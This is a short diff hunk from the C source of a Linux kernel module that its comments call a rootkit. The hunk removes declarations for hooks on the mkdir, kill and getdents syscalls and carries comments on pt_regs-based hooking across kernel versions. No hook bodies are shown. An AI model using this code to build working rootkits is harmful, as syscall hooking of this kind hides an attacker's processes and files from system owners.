@@ -41,22 +41,7 @@ unsigned long __force_order;
 
 enum NR_getdents{
 	__NR_getdents = 141
-}
-
-asmlinkage int hook_mkdir(const struct pt_regs *regs);
-//Hooking kill
-asmlinkage int hook_kill(const struct pt_regs *regs);
-/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
- * declare the orig_getdents64 and hook_getdents64 functions differently
- * depending on the kernel version. This is the larget barrier to
- * getting the rootkit to work on earlier kernel versions. The
- * more modern way is to use the pt_regs struct. */
-
-asmlinkage int hook_getdents64(const struct pt_regs *regs);
-asmlinkage int hook_getdents(const struct pt_regs *regs);
-
-/* This is an old structure that isn't included in the kernel headers anymore 
- * so we have to declare it ourselves */
+};
 
 struct linux_dirent {
         unsigned long   d_ino;
